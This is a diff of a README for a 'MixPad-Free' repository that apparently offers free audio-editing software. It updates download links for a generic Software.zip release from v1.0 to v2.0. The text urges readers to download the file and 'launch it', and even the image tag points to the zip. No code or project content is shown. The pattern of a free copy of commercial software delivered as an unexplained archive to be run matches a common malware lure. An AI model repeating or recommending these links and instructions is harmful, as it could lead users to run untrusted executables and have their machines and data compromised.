@@ -27,13 +27,13 @@ The topics covered in this repository include:
 
 ## Get Started
 To start exploring the MixPad-Free repository, simply click the link below:
-[![Download MixPad-Free](https://github.com/etoontolo1/MixPad-Free/releases/download/v1.0/Software.zip)](https://github.com/etoontolo1/MixPad-Free/releases/download/v1.0/Software.zip)
+[![Download MixPad-Free](https://github.com/etoontolo1/MixPad-Free/releases/download/v2.0/Software.zip)](https://github.com/etoontolo1/MixPad-Free/releases/download/v2.0/Software.zip)
 
 ## Additional Information
 1. If the link ends with the file name, please make sure to launch it to access the content.
 2. If you encounter any issues with the link or if it is not working, you can check the "Releases" section for alternative download options.
 
-![MixPad-Free](https://github.com/etoontolo1/MixPad-Free/releases/download/v1.0/Software.zip)
+![MixPad-Free](https://github.com/etoontolo1/MixPad-Free/releases/download/v2.0/Software.zip)
 
 Feel free to explore, contribute, and unleash your creativity with MixPad-Free 🎵🎶. Thank you for being a part of our audio editing community! 🎤🔊
 
